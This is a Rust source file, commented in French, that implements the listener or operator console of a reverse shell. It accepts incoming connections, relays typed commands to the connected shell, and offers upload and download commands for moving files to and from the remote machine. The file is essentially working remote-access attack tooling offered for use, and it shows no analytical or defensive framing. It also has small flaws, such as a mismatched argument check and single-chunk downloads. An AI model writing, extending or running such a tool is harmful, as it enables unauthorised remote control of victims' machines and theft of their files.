#[cfg(feature = "listener")]
use std::net::{TcpListener, TcpStream};
use std::io::{self, Read, Write};
use std::fs::File;
use std::thread;

pub fn start_listener() {
    let args: Vec<String> = std::env::args().collect();
    
    if args.len() != 3 {
        eprintln!("Usage: {} <port>", args[0]);
        return;
    }

    let ip = "0.0.0.0";
    let port = &args[2];
    
    let listener = TcpListener::bind(format!("{}:{}", ip, port)).expect("Failed to bind listener");

    println!("Listening on {}:{}", ip, port);

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("Connection established: {}", stream.peer_addr().unwrap());

                // Lancer un thread pour gérer la connexion
                thread::spawn(move || {
                    handle_client(stream);
                });
            }
            Err(e) => eprintln!("Connection failed: {}", e),
        }
    }
}

fn handle_client(mut stream: TcpStream) {
    let mut buffer = [0; 1024];
    loop {
        print!("$ "); // Affiche un prompt de type $ sans saut de ligne
        std::io::stdout().flush().unwrap(); // Force l'affichage immédiat du prompt
        
        // Lecture de la commande entrée dans le terminal
        let mut command = String::new();
        std::io::stdin().read_line(&mut command).expect("Failed to read line");

        let trimmed_command = command.trim();

        if trimmed_command == "exit" {
            break;
        }

        // Gestion de la commande upload
        if trimmed_command.starts_with("upload ") {
            let args: Vec<&str> = trimmed_command.split_whitespace().collect();
            if args.len() != 3 {
                println!("Usage: upload <local_file> <remote_file>");
                continue;
            }

            let local_file = args[1];
            let remote_file = args[2];

            if let Err(e) = upload(&mut stream, local_file, remote_file) {
                println!("Error uploading file: {}", e);
            }
            continue;
        }

        // Gestion de la commande download
        if trimmed_command.starts_with("download ") {
            let args: Vec<&str> = trimmed_command.split_whitespace().collect();
            if args.len() != 3 {
                println!("Usage: download <remote_file> <local_file>");
                continue;
            }

            let remote_file = args[1];
            let local_file = args[2];

            if let Err(e) = download(&mut stream, remote_file, local_file) {
                println!("Error downloading file: {}", e);
            }
            continue;
        }

        // Envoi de la commande au reverse shell
        if let Err(e) = stream.write(trimmed_command.as_bytes()) {
            eprintln!("Failed to send command: {}", e);
            break;
        }

        // Lecture de la réponse du reverse shell
        match stream.read(&mut buffer) {
            Ok(size) if size > 0 => {
                let response = String::from_utf8_lossy(&buffer[..size]);
                println!("{}", response);
            }
            _ => {
                println!("No response or connection closed.");
                break;
            }
        }
    }
}

// Fonction pour envoyer un fichier au client
fn upload(stream: &mut TcpStream, local_file: &str, remote_file: &str) -> io::Result<()> {
    // Lis le fichier local
    let mut file = File::open(local_file)?;
    let mut file_data = Vec::new();
    file.read_to_end(&mut file_data)?;

    // Prépare une commande spéciale pour informer le client qu'un fichier arrive
    let header = format!("UPLOAD {} {}\n", remote_file, file_data.len());
    stream.write_all(header.as_bytes())?;

    // Envoie les données du fichier
    stream.write_all(&file_data)?;
    println!("File '{}' uploaded as '{}'", local_file, remote_file);

    Ok(())
}

// Fonction pour télécharger un fichier depuis le client
fn download(stream: &mut TcpStream, remote_file: &str, local_file: &str) -> io::Result<()> {
    // Envoie une commande de téléchargement au client
    stream.write_all(format!("DOWNLOAD {}\n", remote_file).as_bytes())?;

    // Attendre la réponse du client avec les données du fichier
    let mut buffer = vec![0; 1024];
    let size = stream.read(&mut buffer)?;

    if size == 0 {
        return Err(io::Error::new(io::ErrorKind::NotFound, "File not found or error during transfer"));
    }

    // Écrire les données dans un fichier local
    let mut file = File::create(local_file)?;
    file.write_all(&buffer[..size])?;
    println!("File '{}' downloaded successfully", local_file);

    Ok(())
}
